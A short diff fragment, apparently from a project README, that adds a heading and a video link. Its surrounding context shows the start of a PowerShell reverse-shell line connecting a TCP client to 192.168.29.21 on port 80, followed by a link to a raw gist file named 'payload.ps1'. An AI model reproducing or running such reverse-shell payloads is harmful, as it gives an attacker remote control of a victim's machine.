@@ -17,3 +17,6 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.29.21",80);$stream = 
 ```
 
 https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1
+
+## From this video
+https://www.youtube.com/watch?v=A2JNBpUotZM
